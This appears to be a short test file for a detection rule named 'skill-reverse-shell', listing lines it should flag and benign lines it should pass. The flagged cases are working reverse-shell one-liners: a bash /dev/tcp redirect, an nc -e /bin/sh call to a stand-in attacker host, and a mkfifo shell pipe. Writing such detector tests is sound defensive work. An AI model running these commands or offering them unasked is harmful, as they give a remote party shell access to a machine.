# Test cases for skill-reverse-shell

# ruleid: skill-reverse-shell
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1

# ruleid: skill-reverse-shell
nc attacker.example.com 4444 -e /bin/sh

# ruleid: skill-reverse-shell
mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1

# ok: skill-reverse-shell
nc -l 8080 to test the local port

# ok: skill-reverse-shell
Run netstat to inspect open connections.
